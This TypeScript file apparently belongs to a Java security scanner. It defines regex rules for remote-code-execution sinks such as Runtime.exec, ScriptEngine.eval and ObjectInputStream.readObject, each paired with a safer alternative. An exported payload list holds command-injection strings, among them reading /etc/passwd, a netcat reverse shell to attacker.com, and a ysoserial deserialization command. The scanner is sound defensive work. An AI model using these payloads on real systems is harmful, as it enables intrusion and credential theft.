import type { RCERule } from './types'

export const RCE_RULES: RCERule[] = [
  // Runtime.exec 命令执行
  {
    name: 'Runtime.exec Command Injection',
    description: '使用 Runtime.exec() 执行用户输入的命令，存在命令注入风险',
    severity: 'critical',
    patterns: [
      /Runtime\.getRuntime\(\)\.exec\s*\(/g,
      /Runtime\.exec\s*\(/g,
    ],
    rceType: 'command_injection',
    sinkMethods: ['Runtime.exec', 'Runtime.getRuntime().exec'],
    safeAlternative: '使用 ProcessBuilder 数组形式，避免 shell 解释器'
  },
  
  // ProcessBuilder 命令执行
  {
    name: 'ProcessBuilder Command Injection',
    description: '使用 ProcessBuilder 构建并执行命令',
    severity: 'critical',
    patterns: [
      /new\s+ProcessBuilder\s*\(/g,
      /ProcessBuilder\s*\w+\s*=\s*new\s+ProcessBuilder/g,
      /\.start\s*\(\)/g,
    ],
    rceType: 'command_injection',
    sinkMethods: ['ProcessBuilder.start', 'ProcessBuilder.command'],
    safeAlternative: '使用数组形式传递命令和参数，避免字符串拼接'
  },
  
  // ScriptEngine 脚本执行
  {
    name: 'ScriptEngine Script Injection',
    description: 'ScriptEngine.eval() 执行用户输入的脚本代码',
    severity: 'critical',
    patterns: [
      /ScriptEngineManager/g,
      /getEngineByName\s*\(/g,
      /ScriptEngine.*\.eval\s*\(/g,
      /engine\.eval\s*\(/g,
    ],
    rceType: 'script_injection',
    sinkMethods: ['ScriptEngine.eval', 'NashornScriptEngine.eval'],
    safeAlternative: '禁止执行用户输入的脚本，或使用沙箱环境'
  },
  
  // EL 表达式注入
  {
    name: 'EL Expression Injection',
    description: 'Spring EL 表达式解析用户输入',
    severity: 'critical',
    patterns: [
      /ELProcessor/g,
      /elProcessor\.eval\s*\(/g,
      /StandardEvaluationContext/g,
      /expression\.getValue\s*\(/g,
    ],
    rceType: 'el_expression_injection',
    sinkMethods: ['ELProcessor.eval', 'Expression.getValue'],
    safeAlternative: '禁用表达式解析用户输入，使用 SimpleEvaluationContext 限制功能'
  },
  
  // 反序列化 RCE
  {
    name: 'ObjectInputStream Deserialization',
    description: 'ObjectInputStream.readObject() 反序列化用户控制的数据',
    severity: 'critical',
    patterns: [
      /ObjectInputStream/g,
      /new\s+ObjectInputStream\s*\(/g,
      /\.readObject\s*\(\)/g,
      /XMLDecoder.*\.readObject/g,
    ],
    rceType: 'deserialization_rce',
    sinkMethods: ['ObjectInputStream.readObject', 'XMLDecoder.readObject'],
    safeAlternative: '使用 JSON 替代 Java 原生序列化，或使用白名单类过滤'
  },
  
  // 模板注入
  {
    name: 'Template Injection',
    description: '模板引擎解析用户输入',
    severity: 'critical',
    patterns: [
      /Velocity\s*\.\s*evaluate/g,
      /TemplateEngine.*\.process/g,
      /FreeMarker|Thymeleaf.*\.process/g,
    ],
    rceType: 'template_injection',
    sinkMethods: ['Velocity.evaluate', 'TemplateEngine.process'],
    safeAlternative: '严格转义用户输入，使用安全的模板模式'
  },
  
  // 危险反射
  {
    name: 'Dangerous Reflection',
    description: '使用反射加载并执行用户指定的类或方法',
    severity: 'high',
    patterns: [
      /Class\.forName\s*\([^)]+\w+[^)]*\)/g,
      /\.getMethod\s*\([^)]+\w+[^)]*\)/g,
      /method\.invoke\s*\(/g,
    ],
    rceType: 'reflection_rce',
    sinkMethods: ['Class.forName', 'Method.invoke'],
    safeAlternative: '使用白名单限制可加载的类，避免用户控制类名'
  },
]

// RCE Sink 方法列表
export const RCE_SINK_METHODS = [
  'Runtime.getRuntime().exec',
  'Runtime.exec',
  'ProcessBuilder.start',
  'ProcessBuilder.command',
  'ScriptEngine.eval',
  'NashornScriptEngine.eval',
  'ELProcessor.eval',
  'Expression.getValue',
  'ObjectInputStream.readObject',
  'XMLDecoder.readObject',
  'Velocity.evaluate',
  'TemplateEngine.process',
  'Class.forName',
  'Method.invoke',
]

// 攻击 Payload 示例
export const RCE_ATTACK_PAYLOADS = [
  {
    type: 'COMMAND_CHAIN',
    payload: '; cat /etc/passwd',
    description: '命令链注入（Linux）',
    successIndicator: 'root:x:0:0'
  },
  {
    type: 'COMMAND_CHAIN_WIN',
    payload: '& dir',
    description: '命令链注入（Windows）',
    successIndicator: 'Directory of'
  },
  {
    type: 'BACKTICK',
    payload: '$(whoami)',
    description: '命令替换',
    successIndicator: 'root 或当前用户名'
  },
  {
    type: 'PIPE',
    payload: '| nc attacker.com 4444',
    description: '管道注入反弹 shell',
    successIndicator: '反向连接成功'
  },
  {
    type: 'YSOSERIAL',
    payload: 'ysoserial CommonsCollections1 calc.exe',
    description: 'Java 反序列化 payload',
    successIndicator: '计算器弹出或命令执行'
  },
]

// 检测是否有命令净化
export function hasCommandSanitization(sourceCode: string): { hasSanitization: boolean; type?: string } {
  // 检查是否使用了命令白名单
  if (/whitelist|allowedCommands|validCommands/i.test(sourceCode)) {
    return { hasSanitization: true, type: 'whitelist' }
  }
  
  // 检查是否使用了正则过滤
  if (/Pattern\.matches|replaceAll|replace.*[&;|]/i.test(sourceCode)) {
    return { hasSanitization: true, type: 'filter' }
  }
  
  // 检查是否使用了数组形式（ProcessBuilder 安全用法）
  if (/new\s+ProcessBuilder\s*\(\s*new\s+String\[\]/i.test(sourceCode)) {
    return { hasSanitization: true, type: 'array_form' }
  }
  
  return { hasSanitization: false }
}
